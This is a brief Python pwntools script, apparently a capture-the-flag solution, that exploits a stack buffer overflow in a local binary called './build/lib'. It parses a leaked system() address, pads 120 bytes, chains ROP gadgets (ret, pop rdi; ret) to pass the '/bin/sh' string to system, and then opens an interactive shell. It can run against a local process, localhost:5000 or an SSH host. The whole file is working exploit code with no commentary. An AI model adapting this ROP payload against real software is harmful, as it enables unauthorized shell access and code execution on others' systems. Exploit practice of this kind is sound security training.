#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
context.log_level = 'debug'
context.binary = './build/lib'

e = ELF('./build/lib')
rop = ROP('./build/lib')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('localhost', 5000)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/lib', cwd='problemDir')
else:
    p = e.process()

system = p.recvline()
system = system[system.rindex(b' ')+1:-2]
system = int(system, 16)

payload = flat({120: rop.find_gadget(['ret'])[0]}, rop.find_gadget(['pop rdi', 'ret'])[0], next(e.search(b'/bin/sh')), system)

p.sendline(payload)
p.sendline(b"id")
p.interactive()
